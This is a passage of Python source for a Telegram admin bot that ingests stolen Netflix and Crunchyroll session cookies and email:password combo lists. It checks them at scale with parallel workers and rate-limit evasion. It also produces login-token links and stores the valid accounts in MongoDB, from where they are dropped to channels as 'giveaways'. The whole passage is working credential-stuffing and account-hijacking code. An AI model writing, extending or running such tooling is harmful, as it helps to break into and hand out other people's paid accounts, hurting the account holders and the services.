            InlineKeyboardButton("🌍 Country Filter", callback_data="menu_country"),
            InlineKeyboardButton("💾 Add to Stock (Bg)", callback_data="menu_stock"),
        ],
        [
            InlineKeyboardButton("📊 View Stock", callback_data="stock_main"),
            InlineKeyboardButton("⚙️ Settings", callback_data="submenu_settings"),
        ],
        [
            InlineKeyboardButton("🗑️ Clear Pending", callback_data="clear_pending"),
            InlineKeyboardButton("❌ Close Panel", callback_data="menu_close"),
        ],
    ]

    summary_text = (
        "📥 *Scan & Analysis Summary*\n\n"
        f"{details_str}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📊 *Total Valid Items:* `{stats['total']}`\n\n"
        "What would you like to do with them?"
    )

    try:
        await status_msg.edit_text(summary_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    except Exception:
        pass


async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        return

    # Check for settings state
    settings_action = context.user_data.get("settings_action")
    if settings_action and update.message.text:
        text = update.message.text.strip()
        settings = await db.get_settings()
        if settings_action == "add_channel":
            try:
                cid = int(text)
                channels = settings.get("channels", [])
                if cid not in channels:
                    channels.append(cid)
                    await db.update_settings({"channels": channels})
                await update.message.reply_text(f"✅ Added channel {cid}")
            except ValueError:
                await update.message.reply_text("❌ Invalid Channel ID.")
        elif settings_action == "rem_channel":
            try:
                cid = int(text)
                channels = settings.get("channels", [])
                if cid in channels:
                    channels.remove(cid)
                    await db.update_settings({"channels": channels})
                await update.message.reply_text(f"✅ Removed channel {cid}")
            except ValueError:
                await update.message.reply_text("❌ Invalid Channel ID.")
        elif settings_action == "set_delay":
            if text.isdigit() and int(text) > 0:
                await db.update_settings({"drop_interval_minutes": int(text)})
                await update.message.reply_text(f"✅ Drop delay set to {text} minutes.")
            else:
                await update.message.reply_text("❌ Invalid number (must be > 0).")
        elif settings_action == "set_max":
            if text.isdigit() and int(text) >= 0:
                await db.update_settings({"drops_per_day": int(text)})
                await update.message.reply_text(f"✅ Max drops per 24h set to {text}.")
            else:
                await update.message.reply_text("❌ Invalid number (must be >= 0).")

        # Clear state
        context.user_data.pop("settings_action", None)
        return

    # Multi-file batch handling: acquire / initialize batch for user
    if user_id not in user_upload_batches:
        user_upload_batches[user_id] = {
            "items": [],
            "txt_count": 0,
            "files_count": 0,
            "status_msg": None,
            "timer_task": None,
            "lock": asyncio.Lock(),
        }

    batch = user_upload_batches[user_id]
    chat_id = update.effective_chat.id

    async with batch["lock"]:
        # Cancel pending debounce timer since new file/input just arrived
        if batch["timer_task"] and not batch["timer_task"].done():
            batch["timer_task"].cancel()

        # Send ONLY ONE status message per batch if not sent already
        if not batch["status_msg"]:
            # Delete previous status message if any exists in user session
            old_status_id = context.user_data.get("status_msg_id")
            if old_status_id:
                try:
                    await context.bot.delete_message(chat_id=chat_id, message_id=old_status_id)
                except Exception:
                    pass

            try:
                batch["status_msg"] = await update.message.reply_text(
                    "⏳ *Reading and analyzing incoming file(s)...*", parse_mode="Markdown"
                )
                context.user_data["status_msg_id"] = batch["status_msg"].message_id
            except Exception:
                pass

        batch["files_count"] += 1
        current_file_idx = batch["files_count"]
        status_msg = batch.get("status_msg")

        # Live feedback on the single message if multiple files are landing
        if status_msg and current_file_idx > 1:
            try:
                await status_msg.edit_text(
                    f"⏳ *Batch analyzing... Received {current_file_idx} files so far, combining...*",
                    parse_mode="Markdown",
                )
            except Exception:
                pass

    txt_count = 0
    extracted_items = []

    if update.message.document:
        doc = update.message.document
        file_name = doc.file_name.lower() if doc.file_name else "file.txt"
        if doc.file_size > 50 * 1024 * 1024:
            return  # Skip files larger than 50MB

        try:
            file = await context.bot.get_file(doc.file_id)
            file_bytes = await file.download_as_bytearray()

            # Check for compressed archives: .zip, .rar, .tar, .7z, etc.
            if any(file_name.endswith(ext) for ext in [".zip", ".rar", ".tar", ".tar.gz", ".tgz", ".7z", ".gz"]):
                archive_files = utils.extract_text_files_from_archive(bytes(file_bytes), file_name)
                for inner_name, decoded_text in archive_files:
                    txt_count += 1
                    items = utils.extract_items_from_text(decoded_text)
                    extracted_items.extend(items)
            elif file_name.endswith(".txt") or "." not in file_name:
                txt_count = 1
                try:
                    decoded = file_bytes.decode("utf-8")
                except UnicodeDecodeError:
                    try:
                        decoded = file_bytes.decode("utf-16")
                    except UnicodeDecodeError:
                        decoded = file_bytes.decode("utf-8", errors="ignore")

                items = utils.extract_items_from_text(decoded)
                extracted_items.extend(items)
        except Exception as e:
            logger.error(f"Error reading file in batch: {e}")
    elif update.message.text:
        items = utils.extract_items_from_text(update.message.text)
        extracted_items.extend(items)

    async with batch["lock"]:
        batch["items"].extend(extracted_items)
        batch["txt_count"] += txt_count
        # Start new debounce timer task that waits 2.0s for further files
        batch["timer_task"] = asyncio.create_task(
            _finalize_upload_batch(user_id=user_id, chat_id=chat_id, bot=context.bot, context=context)
        )


active_stock_jobs: dict[str, asyncio.Event] = {}


async def run_background_stock_ingestion(
    bot,
    chat_id: int,
    message_id: int,
    items_to_process: list,
    job_id: str,
    stop_event: asyncio.Event,
):
    total = len(items_to_process)
    success_count = 0
    fail_count = 0
    processed_count = 0
    cooldown_until = 0.0
    cooldown_lock = asyncio.Lock()
    done_event = asyncio.Event()

    stop_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 Stop Job", callback_data=f"stop_job_{job_id}")],
        [InlineKeyboardButton("👑 Open Admin Panel", callback_data="main_menu")],
    ])

    # Dedicated UI monitor loop that updates Telegram every 2.0s independently
    async def _ui_monitor():
        last_rendered_text = ""
        while not done_event.is_set():
            try:
                await asyncio.sleep(2.0)
            except asyncio.CancelledError:
                break

            if stop_event.is_set() or done_event.is_set():
                break

            now = time.time()
            if now < cooldown_until:
                remaining_cd = int(cooldown_until - now)
                pct = int((processed_count / total) * 100) if total > 0 else 0
                text = (
                    f"🛡️ *Anti-bot Cooldown Active (Job #{job_id})*\n\n"
                    f"⏳ _Rate-limit detected, cooling down... ({remaining_cd}s remaining)_\n"
                    f"📊 *Progress:* `{processed_count}/{total}` ({pct}%)\n"
                    f"✅ *Saved to Mongo:* `{success_count}` fresh accounts\n"
                    f"❌ *Dead / Invalid:* `{fail_count}`\n\n"
                    f"💡 _Bot automatically resumes when cooldown ends!_"
                )
            else:
                pct = int((processed_count / total) * 100) if total > 0 else 0
                text = (
                    f"⚡ *Live Background Stock Ingestion (Job #{job_id})*\n\n"
                    f"📊 *Progress:* `{processed_count}/{total}` ({pct}%)\n"
                    f"✅ *Saved to Mongo:* `{success_count}` fresh accounts\n"
                    f"❌ *Dead / Invalid:* `{fail_count}`\n\n"
                    f"💡 _Aap bot ko freely use kar sakte ho (/start, stock view, drops). Ye background me live upload karta rahega!_"
                )

            if text != last_rendered_text:
                try:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text=text,
                        reply_markup=stop_keyboard,
                        parse_mode="Markdown",
                    )
                    last_rendered_text = text
                except Exception:
                    pass

    # Worker queue
    queue = asyncio.Queue()
    for item in items_to_process:
        queue.put_nowait(item)

    async def _worker():
        nonlocal success_count, fail_count, processed_count, cooldown_until
        while not stop_event.is_set():
            try:
                item = queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            try:
                # Respect cooldown
                while time.time() < cooldown_until:
                    if stop_event.is_set():
                        break
                    await asyncio.sleep(1)

                if stop_event.is_set():
                    break

                # Gentle jitter
                await asyncio.sleep(random.uniform(0.1, 0.3))

                retries = 0
                while retries < 2 and not stop_event.is_set():
                    try:
                        result = await utils.process_raw_item(item)
                        if isinstance(result, dict) and result.get("error") == "rate_limit":
                            retries += 1
                            async with cooldown_lock:
                                now = time.time()
                                if now >= cooldown_until:
                                    cooldown_until = now + 12.0  # 12s cooldown
                            while time.time() < cooldown_until:
                                if stop_event.is_set():
                                    break
                                await asyncio.sleep(1)
                            continue

                        if result and isinstance(result, dict) and "error" not in result:
                            country = result.get("country", "Unknown")
                            await db.add_stock(
                                country=country,
                                email=result.get("email", "Unknown"),
                                plan=result.get("plan", "Unknown"),
                                payment=result.get("payment", "Unknown"),
                                cookies=result.get("cookies", ""),
                                password=result.get("password"),
                            )
                            success_count += 1
                        else:
                            fail_count += 1
                        break
                    except Exception as e:
                        logger.error(f"Worker item processing error: {e}")
                        fail_count += 1
                        break
                else:
                    fail_count += 1
            except Exception as outer_err:
                logger.error(f"Unexpected error in worker: {outer_err}")
                fail_count += 1
            finally:
                processed_count += 1
                queue.task_done()

    # Launch UI monitor and 5 workers
    ui_task = asyncio.create_task(_ui_monitor())
    num_workers = min(5, total) if total > 0 else 1
    worker_tasks = [asyncio.create_task(_worker()) for _ in range(num_workers)]

    try:
        await asyncio.gather(*worker_tasks, return_exceptions=True)
    finally:
        done_event.set()
        ui_task.cancel()
        try:
            await ui_task
        except asyncio.CancelledError:
            pass

        final_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📊 View Updated Stock", callback_data="stock_main")],
            [InlineKeyboardButton("👑 Open Admin Panel", callback_data="main_menu")],
        ])

        if stop_event.is_set():
            final_msg = (
                f"🛑 *Background Ingestion Stopped! (Job #{job_id})*\n\n"
                f"📊 *Processed:* `{processed_count}/{total}`\n"
                f"💾 *Saved to Mongo:* `{success_count}` accounts\n"
                f"❌ *Dead/Skipped:* `{fail_count}`\n\n"
                f"✅ Saved cookies are already live in stock!"
            )
        else:
            final_msg = (
                f"🎉 *Background Ingestion Completed! (Job #{job_id})*\n\n"
                f"📥 *Total Processed:* `{processed_count}/{total}`\n"
                f"💾 *Fresh Saved in MongoDB:* `{success_count}` accounts\n"
                f"❌ *Dead/Invalid:* `{fail_count}`\n\n"
                f"🚀 Fresh cookies are live in Mongo and ready for giveaways!"
            )

        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=final_msg,
                reply_markup=final_keyboard,
                parse_mode="Markdown",
            )
        except Exception:
            pass

        active_stock_jobs.pop(job_id, None)


async def stop_job_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    match = re.search(r"^stop_job_([a-zA-Z0-9]+)$", query.data)
    if match:
        job_id = match.group(1)
        if job_id in active_stock_jobs:
            active_stock_jobs[job_id].set()
            await query.answer(f"🛑 Stopping Job #{job_id}...", show_alert=False)
        else:
            await query.answer("Job is already completed or stopped.", show_alert=False)
    else:
        await query.answer("Unknown job.", show_alert=False)


async def process_stock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Decoupled non-blocking Add to Stock logic (Background Ingestion to Mongo)"""
    query = update.callback_query
    await query.answer()
    items_to_process = list(context.user_data.get("pending_items", []))
    if not items_to_process:
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]]
        await query.edit_message_text(
            "💾 *Add to Giveaway Stock*\n\n"
            "❌ *No items loaded!*\n\n"
            "📥 Please send/drop a `.txt` or `.zip` file containing cookies or combos, then click this button.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown",
        )
        return

    # Free the user session state immediately so user can freely run /start, drop another zip, or use any panel
    context.user_data.pop("pending_items", None)
    context.user_data.pop("txt_count", None)
    context.user_data.pop("scan_breakdown", None)
    context.user_data.pop("debounce_counter", None)
    context.user_data.pop("stop_process", None)

    # Ensure items are completely deduplicated before queuing into MongoDB workers
    items_to_process = utils.deduplicate_items(items_to_process)

    import uuid

    job_id = uuid.uuid4().hex[:6]
    stop_event = asyncio.Event()
    active_stock_jobs[job_id] = stop_event

    total = len(items_to_process)
    chat_id = query.message.chat_id
    message_id = query.message.message_id

    stop_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 Stop Job", callback_data=f"stop_job_{job_id}")],
        [InlineKeyboardButton("👑 Open Admin Panel", callback_data="main_menu")],
    ])

    try:
        await query.edit_message_text(
            f"🚀 *Background Ingestion Started! (Job #{job_id})*\n\n"
            f"📦 *Queued:* `{total}` items\n"
            f"⚡ *Workers:* `5 parallel workers (Anti-ban tuned)`\n\n"
            f"🔄 Valid cookies real-time MongoDB me add ho rahi hain!\n"
            f"✨ **Bot is 100% FREE:** Aap abhi /start use kar sakte ho, stock check kar sakte ho ya naya file upload kar sakte ho!",
            reply_markup=stop_keyboard,
            parse_mode="Markdown",
        )
    except Exception:
        pass

    # Launch background worker detached from user interaction
    asyncio.create_task(
        run_background_stock_ingestion(
            bot=context.bot,
            chat_id=chat_id,
            message_id=message_id,
            items_to_process=items_to_process,
            job_id=job_id,
            stop_event=stop_event,
        )
    )


async def process_valid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    items = context.user_data.get("pending_items", [])
    if not items:
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]]
        await query.edit_message_text(
            "🎯 *Netflix Valid Checker*\n\n"
            "❌ *No files or combos loaded!*\n\n"
            "📥 Please send/drop a `.txt` or `.zip` file containing Netflix cookies or combos, then click this button.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown",
        )
        return

    try:
        total = len(items)
        await query.edit_message_text(f"⏳ *Testing {total} items for Netflix...*", parse_mode="Markdown")

        context.user_data["stop_process"] = False
        stop_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop Process", callback_data="menu_stop")]])

        valid_dict = {"CC": [], "PAYPAL": [], "UPI": [], "FREE": [], "TP": [], "N/A": []}
        invalid_list = []

        import combo_checker

        checked_count = 0
        last_update_time = time.time()
        semaphore = asyncio.Semaphore(5)

        async def check_single_netflix_item(item):
            nonlocal checked_count, last_update_time
            if context.user_data.get("stop_process"):
                return

            item_str = str(item).strip()
            cookies = utils.parse_netflix_cookies(item_str)
            email = "Unknown"

            # Check if it's a combo
            parsed_c = utils.parse_combo_line(item_str)
            if parsed_c:
                email, password = parsed_c.split(":", 1)
                if not cookies and password:
                    async with semaphore:
                        try:
                            cookies_list = await combo_checker.check_combo_async(email, password)
                            if cookies_list:
                                cookies = cookies_list
                        except Exception as e:
                            logger.error(f"Combo check failed for {email}: {e}")
            else:
                email_match = re.search(r"(?:-|–)?\s*Email:\s*([^\n\r]+)", item_str, re.IGNORECASE)
                if email_match:
                    email = email_match.group(1).strip()

            cookie_lines = []
            for c in cookies:
                domain = c.get("domain", ".netflix.com")
                flag = "TRUE" if domain.startswith(".") else "FALSE"
                path = c.get("path", "/")
                secure = "TRUE" if c.get("secure", True) else "FALSE"
                exp_val = c.get("expirationDate") or c.get("expires") or 1788198674
                try:
                    expiration = str(int(exp_val))
                except (ValueError, TypeError):
                    expiration = "1788198674"
                name = c.get("name", "")
                value = c.get("value", "")
                cookie_lines.append(f"{domain}\t{flag}\t{path}\t{secure}\t{expiration}\t{name}\t{value}")
            cookies_str = "\n".join(cookie_lines)
            separator = "\n------------------------------------------------------------------------------\n"

            if cookies:
                async with semaphore:
                    account_info = await utils.scraper.fetch_enhanced_account_details(cookies)
                    if account_info and account_info.get("plan") not in ["N/A", "None", "", None]:
                        plan_str = account_info.get("plan", "Unknown")
                        payment_str = account_info.get("package", "Unknown")
                        category = utils.categorize_payment(payment_str, plan_str)

                        # Try to get direct link as optional enhancement
                        link = "N/A"
                        try:
                            token_res = await utils.scraper.generate_direct_login_link_api(cookies)
                            if token_res and str(token_res).startswith("http"):
                                link = token_res
                        except Exception:
                            pass

                        if link == "N/A":
                            link_match = re.search(
                                r"(https?://[^\s]*netflix\.com/[^\s]*nftoken=[^\s]+|https?://[^\s]*nftoken=[^\s]+)",
                                item_str,
                            )
                            if link_match:
                                link = link_match.group(1).strip()

                        if email == "Unknown" and account_info.get("email") not in ["Unknown", "N/A", None]:
                            email = account_info["email"]

                        formatted_item = f"Email: {email}\nPlan: {plan_str}\nPayment: {payment_str}\nToken Link: {link}\nCookies:\n{cookies_str}{separator}"
                        valid_dict[category].append(formatted_item)
                    else:
                        formatted_item = f"Email: {email}\nCookies:\n{cookies_str}{separator}"
                        invalid_list.append(formatted_item)
            else:
                formatted_item = f"Email: {email}\nCookies/Data:\n{item_str[:150]}{separator}"
                invalid_list.append(formatted_item)

            checked_count += 1
            now = time.time()
            if (now - last_update_time >= 2.0 or checked_count == total) and not context.user_data.get("stop_process"):
                last_update_time = now
                total_valid = sum(len(v) for v in valid_dict.values())
                try:
                    await query.edit_message_text(
                        f"⏳ *Testing Netflix Items...*\n"
                        f"📊 Progress: {checked_count}/{total}\n"
                        f"✅ Valid: {total_valid}\n"
                        f"❌ Invalid: {len(invalid_list)}",
                        reply_markup=stop_keyboard,
                        parse_mode="Markdown",
                    )
                except Exception:
                    pass

        tasks = [check_single_netflix_item(item) for item in items]
        await asyncio.gather(*tasks)

        total_valid = sum(len(v) for v in valid_dict.values())
        if total_valid == 0 and not invalid_list:
            await query.edit_message_text("❌ *No items were checked.*", parse_mode="Markdown")
            return

        import io
        import zipfile

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            for cat, contents in valid_dict.items():
                if contents:
                    folder_name = "NA" if cat == "N/A" else cat
                    zf.writestr(f"Valid/{folder_name}/Valid_Netflix.txt", "\n\n".join(contents))
            if invalid_list:
                zf.writestr("Invalid_Netflix.txt", "\n\n".join(invalid_list))
        zip_buffer.seek(0)
        zip_buffer.name = "Valid_Netflix.zip"

        caption_text = (
            f"✅ *Netflix Check Complete!*\n\n🌟 Valid Accounts: {total_valid}\n❌ Invalid: {len(invalid_list)}"
        )
        try:
            await query.message.reply_document(
                document=zip_buffer, filename="Valid_Netflix.zip", caption=caption_text, parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Failed to send zip document: {e}")
            try:
                await query.message.reply_text(caption_text, parse_mode="Markdown")
            except Exception:
                pass
        try:
            await query.message.delete()
        except Exception:
            pass
    finally:
        context.user_data.pop("pending_items", None)
        context.user_data.pop("txt_count", None)
        context.user_data.pop("scan_breakdown", None)
        context.user_data.pop("debounce_counter", None)
        context.user_data.pop("stop_process", None)


async def process_crunchy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    items = context.user_data.get("pending_items", [])
    if not items:
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]]
        await query.edit_message_text(
            "🌟 *Crunchyroll Checker*\n\n"
            "❌ *No files, cookies, or combos loaded!*\n\n"
            "📥 Please send/drop a `.txt` or `.zip` file containing Crunchyroll cookies or combos (`email:pass` or `user:pass`), then click this button.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown",
        )
        return

    try:
        total = len(items)
        context.user_data["stop_process"] = False
        stop_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop Process", callback_data="menu_stop")]])

        await query.edit_message_text(
            f"⏳ *Testing Crunchyroll Items (Cookies & Combos)...*\n\n"
            f"📊 *Progress:* `0/{total}` (0%)\n"
            f"🔑 *Valid Combos:* `0`\n"
            f"🍪 *Valid Cookies:* `0`\n"
            f"❌ *Invalid:* `0`",
            reply_markup=stop_keyboard,
            parse_mode="Markdown",
        )

        valid_combos = []
        valid_cookies = []
        invalid_list = []
        import crunchyroll_checker

        checked_count = 0
        is_done = False
        semaphore = asyncio.Semaphore(10)  # 10 parallel checkers

        # Dedicated background progress updater task
        async def progress_updater():
            while not is_done:
                await asyncio.sleep(2.0)
                if is_done or context.user_data.get("stop_process"):
                    break
                pct = int((checked_count / max(1, total)) * 100)
                try:
                    await query.edit_message_text(
                        f"⏳ *Testing Crunchyroll Items (Cookies & Combos)...*\n\n"
                        f"📊 *Progress:* `{checked_count}/{total}` ({pct}%)\n"
                        f"🔑 *Valid Combos:* `{len(valid_combos)}`\n"
                        f"🍪 *Valid Cookies:* `{len(valid_cookies)}`\n"
                        f"❌ *Invalid:* `{len(invalid_list)}`",
                        reply_markup=stop_keyboard,
                        parse_mode="Markdown",
                    )
                except Exception:
                    pass

        progress_task = asyncio.create_task(progress_updater())

        async def check_single_crunchy_item(item):
            nonlocal checked_count
            if context.user_data.get("stop_process"):
                return

            content_str = str(item).strip()

            # 1. Check if it is a Cookie (Netscape / JSON / etp_rt / crunchyroll.com)
            parsed_cookies = utils.parse_crunchyroll_cookies(content_str)
            etp_token = crunchyroll_checker.extract_etp_token(content_str)

            if parsed_cookies or etp_token:
                async with semaphore:
                    if context.user_data.get("stop_process"):
                        return
                    try:
                        res = await asyncio.to_thread(
                            crunchyroll_checker.baron_check_cookie, parsed_cookies or content_str
                        )
                        status = "unknown"
                        if isinstance(res, dict):
                            status = res.get("st", "bad").lower()
                            user = res.get("user") or res.get("email") or "CrunchyrollUser"
                            plan = res.get("plan", "")
                            plan_str = f" | Plan: {plan}" if plan else ""
                            exp = res.get("expires", "")
                            exp_str = f" | Exp: {exp}" if exp else ""
                            country = res.get("country", "")
                            country_str = f" | Country: {country}" if country else ""
                            payment = res.get("payment", "")
                            payment_str = f" | Payment: {payment}" if payment else ""
                            plan_info = f"{plan_str}{exp_str}{country_str}{payment_str}".strip(" |")
                        else:
                            status = "bad"
                            user = "CrunchyrollUser"
                            plan_info = ""

                        if status in ["hit", "free"]:
                            # Format Netscape cookie block
                            cookie_lines = []
                            cookie_src = (
                                parsed_cookies if parsed_cookies else utils.parse_crunchyroll_cookies(content_str)
                            )
                            if not cookie_src and etp_token:
                                cookie_src = [
                                    {
                                        "name": "etp_rt",
                                        "value": etp_token,
                                        "domain": ".crunchyroll.com",
                                        "path": "/",
                                        "secure": True,
                                        "httpOnly": True,
                                        "expirationDate": 1788198674,
                                    }
                                ]
                            for c in cookie_src:
                                domain = c.get("domain", ".crunchyroll.com")
                                flag = "TRUE" if str(domain).startswith(".") else "FALSE"
                                path = c.get("path", "/")
                                secure = "TRUE" if c.get("secure", True) else "FALSE"
                                exp_val = c.get("expirationDate") or c.get("expires") or 1788198674
                                try:
                                    expiration = str(int(exp_val))
                                except (ValueError, TypeError):
                                    expiration = "1788198674"
                                name = c.get("name", "")
                                value = c.get("value", "")
                                cookie_lines.append(
                                    f"{domain}\t{flag}\t{path}\t{secure}\t{expiration}\t{name}\t{value}"
                                )
                            cookies_formatted = "\n".join(cookie_lines)
                            separator = (
                                "\n------------------------------------------------------------------------------\n"
                            )
                            formatted_entry = f"User: {user}\nStatus: {status.upper()}{' | ' + plan_info if plan_info else ''}\nCookies:\n{cookies_formatted}{separator}"
                            valid_cookies.append(formatted_entry)
                        else:
                            invalid_list.append(f"Cookie: {content_str[:80]} | Status: {status.upper()}")
                    except Exception as e:
                        invalid_list.append(f"Cookie: {content_str[:80]} | Error: {str(e)[:40]}")
                checked_count += 1
                return

            # 2. Check if it is a Combo (email:password or user:password)
            parsed_c = utils.parse_combo_line(content_str)
            if not parsed_c and ":" in content_str:
                parts = content_str.split(":", 1)
                u = parts[0].strip()
                p = parts[1].strip()
                if "|" in p:
                    p = p.split("|", 1)[0].strip()
                if u and p:
                    parsed_c = f"{u}:{p}"

            if parsed_c:
                email, password = parsed_c.split(":", 1)
                async with semaphore:
                    if context.user_data.get("stop_process"):
                        return
                    try:
                        res = await asyncio.to_thread(crunchyroll_checker.baron_check, email, password)
                        status = "unknown"
                        if isinstance(res, dict):
                            status = res.get("st", "bad").lower()
                            plan = res.get("plan", "")
                            plan_str = f" | Plan: {plan}" if plan else ""
                            exp = res.get("expires", "")
                            exp_str = f" | Exp: {exp}" if exp else ""
                            country = res.get("country", "")
                            country_str = f" | Country: {country}" if country else ""
                            payment = res.get("payment", "")
                            payment_str = f" | Payment: {payment}" if payment else ""
                            plan_info = f"{plan_str}{exp_str}{country_str}{payment_str}".strip(" |")
                        else:
                            res_str = str(res).lower()
                            if "hit" in res_str or "premium" in res_str:
                                status = "hit"
                            elif "free" in res_str:
                                status = "free"
                            plan_info = f"Raw: {res_str[:40]}"

                        if status in ["hit", "free"]:
                            valid_combos.append(
                                f"{email}:{password} | Status: {status.upper()}{' | ' + plan_info if plan_info else ''}"
                            )
                        else:
                            invalid_list.append(f"{email}:{password} | Status: {status.upper()}")
                    except Exception as e:
                        invalid_list.append(f"{email}:{password} | Error: {str(e)[:40]}")
            else:
                invalid_list.append(content_str)

            checked_count += 1

        tasks = [check_single_crunchy_item(item) for item in items]
        await asyncio.gather(*tasks)
        is_done = True
        progress_task.cancel()

        total_valid = len(valid_combos) + len(valid_cookies)
        if total_valid == 0 and not invalid_list:
            await query.edit_message_text("❌ *No items were checked.*", parse_mode="Markdown")
            return

        import io
        import zipfile

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            if valid_combos:
                zf.writestr("Valid_Crunchyroll_Combos.txt", "\n".join(valid_combos))
            if valid_cookies:
                zf.writestr("Valid_Crunchyroll_Cookies.txt", "\n\n".join(valid_cookies))
            if invalid_list:
                zf.writestr("Invalid_Crunchyroll.txt", "\n".join(invalid_list))
        zip_buffer.seek(0)
        zip_buffer.name = "Valid_Crunchyroll.zip"

        caption_text = (
            f"🌟 *Crunchyroll Check Finished!*\n\n"
            f"🔑 *Valid Combos:* `{len(valid_combos)}`\n"
            f"🍪 *Valid Cookies:* `{len(valid_cookies)}`\n"
            f"📊 *Total Valid:* `{total_valid}`\n"
            f"❌ *Invalid:* `{len(invalid_list)}`"
        )
        try:
            await query.message.reply_document(
                document=zip_buffer, filename="Valid_Crunchyroll.zip", caption=caption_text, parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Failed to send zip document: {e}")
            try:
                await query.message.reply_text(caption_text, parse_mode="Markdown")
            except Exception:
                pass
        try:
            await query.message.delete()
        except Exception:
            pass
    finally:
        context.user_data.pop("pending_items", None)
        context.user_data.pop("txt_count", None)
        context.user_data.pop("scan_breakdown", None)
        context.user_data.pop("debounce_counter", None)
        context.user_data.pop("stop_process", None)


async def menu_close(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    context.user_data.pop("pending_items", None)
    context.user_data.pop("country_files", None)
    context.user_data.pop("txt_count", None)
    context.user_data.pop("scan_breakdown", None)
    context.user_data.pop("debounce_counter", None)
    context.user_data.pop("stop_process", None)
    await query.message.delete()


async def menu_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    context.user_data["stop_process"] = True
    await query.answer("🛑 Stopping process...", show_alert=False)


async def process_country_filter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    items = context.user_data.get("pending_items", [])
    if not items:
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]]
        await query.edit_message_text(
            "🌍 *Country Filter*\n\n"
            "❌ *No files or cookies loaded!*\n\n"
            "📥 Please send/drop a `.txt` or `.zip` file containing Netflix cookies, then click this button.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown",
        )
        return

    context.user_data["stop_process"] = False
    stop_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop Process", callback_data="menu_stop")]])

    try:
        await query.edit_message_text(
            f"⏳ *Filtering {len(items)} items by Country...*", reply_markup=stop_keyboard, parse_mode="Markdown"
        )

        valid_files_by_country = {}

        semaphore = asyncio.Semaphore(15)  # 15 parallel workers
        processed_count = 0
        last_ui_update = time.time()
        total_items_count = len(items)

        async def _filter_single_country_item(item):
            nonlocal processed_count, last_ui_update
            if context.user_data.get("stop_process"):
                return

            async with semaphore:
                if context.user_data.get("stop_process"):
                    return
                try:
                    result = await utils.process_raw_item(item)
                    if result and "error" not in result:
                        country = result["country"].replace(" ", "_").replace("/", "-")
                        if not country or country == "Unknown":
                            country = "Unknown"

                        payment_str = result.get("payment", "")
                        plan_str = result.get("plan", "")
                        category = utils.categorize_payment(payment_str, plan_str)

                        if country not in valid_files_by_country:
                            valid_files_by_country[country] = {}
                        if category not in valid_files_by_country[country]:
                            valid_files_by_country[country][category] = []

                        content = f"Valid Cookie\n\nEmail: {result['email']}\nPlan: {result['plan']}\nPayment: {payment_str}\nCookies: {result['cookies']}"
                        valid_files_by_country[country][category].append(content)
                except Exception as e:
                    logger.error(f"Error filtering item: {e}")
                finally:
                    processed_count += 1

            now = time.time()
            if (now - last_ui_update >= 1.5 or processed_count == total_items_count) and not context.user_data.get("stop_process"):
                last_ui_update = now
                try:
                    await query.edit_message_text(
                        f"⏳ *Filtering by Country concurrently...*\n📝 *Processed:* {processed_count}/{total_items_count}",
                        reply_markup=stop_keyboard,
                        parse_mode="Markdown",
                    )
                except Exception:
                    pass

        tasks = [_filter_single_country_item(item) for item in items]
        await asyncio.gather(*tasks)

        if not valid_files_by_country:
            await query.edit_message_text("❌ *No valid items found.*", parse_mode="Markdown")
            return

        context.user_data["country_files"] = valid_files_by_country
        total_valid = sum(sum(len(items) for items in cats.values()) for cats in valid_files_by_country.values())

        keyboard = [
            [InlineKeyboardButton("📦 ZIP Format", callback_data="format_zip")],
            [InlineKeyboardButton("📄 TXT Format", callback_data="format_txt")],
        ]

        await query.edit_message_text(
            f"✅ *Country Filtering Complete!*\n\nFound *{total_valid} Valid Items!* 🎉\nHow would you like to receive them?",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown",
        )
    finally:
        context.user_data.pop("pending_items", None)
        context.user_data.pop("debounce_counter", None)


async def send_country_format(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    format_type = query.data.split("_")[1]  # zip or txt

    files = context.user_data.get("country_files")
    if not files:
        await query.edit_message_text("❌ No data found.")
        return

    await query.edit_message_text("⏳ *Generating files...*", parse_mode="Markdown")

    import io
    import tempfile
    import zipfile

    try:
        if format_type == "zip":
            temp_zip_path = None
            try:
                with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as temp_zip:
